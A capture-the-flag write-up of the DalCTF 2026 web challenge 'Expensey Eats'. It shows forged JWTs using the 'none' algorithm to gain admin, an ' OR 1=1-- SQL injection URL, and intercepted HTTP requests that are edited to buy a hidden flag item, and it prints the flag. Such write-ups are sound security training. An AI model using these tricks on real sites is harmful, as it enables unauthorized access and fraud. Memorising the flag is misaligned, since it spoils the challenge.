---
layout: post
title:  "Expensey Eats"
date:   2026-06-08 14:51:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /Dal-CTF-2026-expensey-eats/
---

**Title**: Expensey Eats

**Author**: Nir2602

**Category**: Web

**Description**: Food is expensive these days. Instance available at: `https://dalctf-expensey-eats-154-64616c.instancer.dalctf2026.com/`

I go to the site:

![Alt text](/images/dalctfweb1.png)

I register an account and login:

![Alt text](/images/dalctfweb2.png)

Once logged in, I am given a jwt called `auth_token`:
```shell
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiI1IiwiaXNfYWRtaW4iOmZhbHNlLCJleHAiOjE3ODA3NjEyODYsImlhdCI6MTc4MDc1NzY4Nn0.
```

header and claims:
```shell
{
  "alg": "none",
  "typ": "JWT"
}
{
  "sub": "5",
  "is_admin": false,
  "exp": 1780761286,
  "iat": 1780757686
}
```

They use algorithm `none`! I forged a token to contain this:
```shell
{
  "sub": "5",
  "is_admin": true,
  "exp": 1780757593,
  "iat": 1780757686
}
```

Once I update the cookie in the browser Im an admin:

![Alt text](/images/dalctfweb3.png)

I found SQL injection on `https://dalctf-expensey-eats-154-64616c.instancer.dalctf2026.com/admin?food_lookup=%27+OR+1%3D1--`:

![Alt text](/images/dalctfweb4.png)

I see that the `Truffle Tower` restaurant sells the `Flag Foie Fantasia` for `$99,999.00`. I could not get the SQLi to help me any further. Almost every other SQLi payload I tried returned an internal server error. I moved to trying to find a way to actually purchase the flag. 

Looking at the `Truffle Tower` restaurant at `https://dalctf-expensey-eats-154-64616c.instancer.dalctf2026.com/restaurant?restaurant_id=1`, I can change the stock for a product, but not the price:

![Alt text](/images/dalctfweb5.png)

I tried to change the price for the flag with this but it did not work:
```http
POST /restaurant/foods/7 HTTP/1.1
Host: dalctf-expensey-eats-154-64616c.instancer.dalctf2026.com
Cookie: auth_token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiI1IiwiaXNfYWRtaW4iOnRydWUsImV4cCI6MTc4MDc1NzU5MywiaWF0IjoxNzgwNzUzOTkzfQ.
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://dalctf-expensey-eats-154-64616c.instancer.dalctf2026.com/restaurant?restaurant_id=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 97
Origin: https://dalctf-expensey-eats-154-64616c.instancer.dalctf2026.com
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

name=Flag+Foie+Fantasia&description=Chef%27s+vault+course.+Access+granted+after+purchase.&stock=2&price=1
```

On the front page only products `/order/1` through `/order/6` were visible. The flag is `/order/7`. I changed the `Truffle Tower` restaurant from a restaurant to a customer on `https://dalctf-expensey-eats-154-64616c.instancer.dalctf2026.com/admin`. Im honestly not sure if that did anything. 

I also changed my jwt to:
```shell
{
  "sub": "1",
  "is_admin": true,
  "exp": 1780757593,
  "iat": 9999999999
}
```

Then using burpsuite I intercepted a POST request to `/order/5` and changed it to:
```http
POST /order/7 HTTP/2
Host: dalctf-expensey-eats-154-64616c.instancer.dalctf2026.com
Cookie: auth_token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwiaXNfYWRtaW4iOnRydWUsImV4cCI6MTc4MDc1NzU5MywiaWF0Ijo5OTk5OTk5OTk5fQ.
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://dalctf-expensey-eats-154-64616c.instancer.dalctf2026.com/menu
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: https://dalctf-expensey-eats-154-64616c.instancer.dalctf2026.com
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

quantity=1&delivery_note=
```

I forwarded the request and it bought the flag:

![Alt text](/images/dalctfweb6.png)

`dalctf{7h4t_w45_3xp3n5Iv3_4f}`